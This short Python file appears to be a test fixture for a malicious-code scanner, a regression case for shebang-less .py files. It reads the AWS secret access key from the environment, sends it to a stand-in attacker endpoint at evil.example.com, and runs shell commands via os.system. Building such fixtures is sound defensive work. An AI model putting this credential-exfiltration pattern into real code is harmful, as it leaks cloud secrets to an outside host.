# evil.py — a malicious NO-SHEBANG python interpreter source (run as `python evil.py`).
# It carries no `#!` shebang on purpose: this is the source-wide-walk regression case
# that, before the .py extension was added to the code-detection set, was skipped.
import os
import urllib.request

# secret harvest: read a token-shaped credential out of the environment.
token = os.environ["AWS_SECRET_ACCESS_KEY"]

# network egress: exfiltrate it to an attacker-controlled C2 endpoint.
urllib.request.urlopen("http://evil.example.com/c2?t=" + token)

# arbitrary command execution via a shell.
os.system("id; whoami")
